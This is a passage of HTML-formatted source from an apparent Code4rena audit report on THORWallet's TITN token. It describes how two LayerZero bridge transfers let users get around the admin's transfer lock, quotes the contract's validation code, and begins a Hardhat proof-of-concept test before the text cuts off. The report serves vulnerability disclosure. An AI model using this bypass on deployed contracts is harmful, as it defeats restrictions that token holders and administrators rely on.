href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-747\"\u003efalconhoof\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-4\"\u003eGiorgio\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-622\"\u003ehezze\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-371\"\u003eiamandreiski\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-392\"\u003ejesjupyter\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-342\"\u003ekn0t\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-501\"\u003eKupiaSec\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-489\"\u003eMrValioBg\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-116\"\u003epairingfriendly\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-374\"\u003ePelz\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-526\"\u003ephoenixV110\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-261\"\u003eradev_sw\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-401\"\u003eslowbugmayor\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-161\"\u003eSpicyMeatball\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-404\"\u003eundefined_joe\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-304\"\u003evladi319\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-59\"\u003eweb3km\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-688\"\u003eX-Tray03\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-175\"\u003eZoA\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-638\"\u003ezzykxx\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L103\"\u003ehttps://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L103\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-1\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-1\" aria-label=\"finding description and impact 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eWhen \u003ccode\u003eisBridgedTokensTransferLocked\u003c/code\u003e is set to true, regular users’ \u003ccode\u003etransfer\u003c/code\u003e and \u003ccode\u003etransferFrom\u003c/code\u003e operations will be restricted. Regular users should not send their tokens to any address other than the \u003ccode\u003etransferAllowedContract\u003c/code\u003e and \u003ccode\u003elzEndpoint\u003c/code\u003e. However, since bridge operations are not subject to this restriction, users can send tokens to any address by performing two bridge transfers.\u003cbr\u003e\nThis breaks the primary invariant: \u003cem\u003eUnless enabled (or the user is the admin), users who merge their TGT to TITN should not be able to transfer them to any address other than the LayerZero endpoint or a specified contract address (\u003ccode\u003etransferAllowedContract\u003c/code\u003e).\u003c/em\u003e\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-1\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eThe TITN contract overrides the \u003ccode\u003etransfer\u003c/code\u003e and \u003ccode\u003etransferFrom\u003c/code\u003e functions, adding the \u003ccode\u003e_validateTransfer\u003c/code\u003e validation to restrict regular users’ transfers in certain cases, as determined by the admin.\n\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L71\"\u003ehttps://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L71\u003c/a\u003e. \u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_validateTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003esuper\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_validateTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003esuper\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     * @\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edev\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eValidates\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erestrictions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     * @\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eThe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;s address\u003c/span\u003e\u003cspan class=\"mtk14\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     * @\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eThe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erecipient\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;s address\u003c/span\u003e\u003cspan class=\"mtk14\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     */\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_validateTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Arbitrum chain ID\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbitrumChainId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e42161\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Check if the transfer is restricted\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Exclude owner from restrictions\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etransferAllowedContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Allow transfers to the transferAllowedContract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etransferAllowedContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Allow transfers to the transferAllowedContract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokensTransferLocked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Check if bridged transfers are locked\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Restrict bridged token holders OR apply Arbitrum-specific restriction\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] || \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003echainid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbitrumChainId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elzEndpoint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Allow transfers to LayerZero endpoint\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eBridgedTokensTransferLocked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, since bridge operations do not use \u003ccode\u003etransfer\u003c/code\u003e/\u003ccode\u003etransferFrom\u003c/code\u003e, but instead use \u003ccode\u003emint\u003c/code\u003e/\u003ccode\u003eburn\u003c/code\u003e, this allows users to transfer tokens to any address by performing two bridge operations. \u003c/p\u003e\n\u003cp\u003eFor example:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eCurrently, \u003ccode\u003eisBridgedTokensTransferLocked\u003c/code\u003e is set to \u003ccode\u003etrue\u003c/code\u003e, and \u003ccode\u003euser1\u003c/code\u003e holds 1 Ether TITN on Arbitrum. \u003ccode\u003euser1\u003c/code\u003e wants to transfer these tokens to \u003ccode\u003euser2\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003euser1\u003c/code\u003e calls \u003ccode\u003esend\u003c/code\u003e to bridge the TITN to their address on Base.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003euser1\u003c/code\u003e calls \u003ccode\u003esend\u003c/code\u003e again on Base to bridge the TITN to \u003ccode\u003euser2\u003c/code\u003e’s address on Arbitrum.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003euser1\u003c/code\u003e successfully sends 1 Ether TITN to \u003ccode\u003euser2\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e \u003cstrong\u003eProof Of Concept\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eTo run the POC, you can add the following code to the test/hardhat/MergeTgt.test.ts file:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;user1  transfer TITN tokens to user2 by bridge when transfer disable\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// transfer TGT to the merge contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;100\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAndCall\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;100\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan 